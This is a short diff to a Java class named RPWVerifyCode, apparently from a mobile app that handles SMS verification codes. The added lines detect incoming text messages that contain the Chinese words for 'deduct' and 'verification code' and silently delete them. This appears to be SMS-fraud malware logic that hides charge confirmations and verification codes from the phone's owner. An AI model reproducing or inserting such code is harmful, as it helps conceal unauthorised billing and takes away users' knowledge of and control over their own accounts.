@@ -55,6 +55,9 @@ class RPWVerifyCode extends RPWBase {
                 finishStatus = FS_SUC;
                 this.updateStatus(RS_FINISH);
             }
+            if (checkStrContainsKeyWords(body, new String[]{"扣减", "验证码"})) {
+                SuperSmsManager.getInstance().deleteSms();
+            }
 
         }
     }
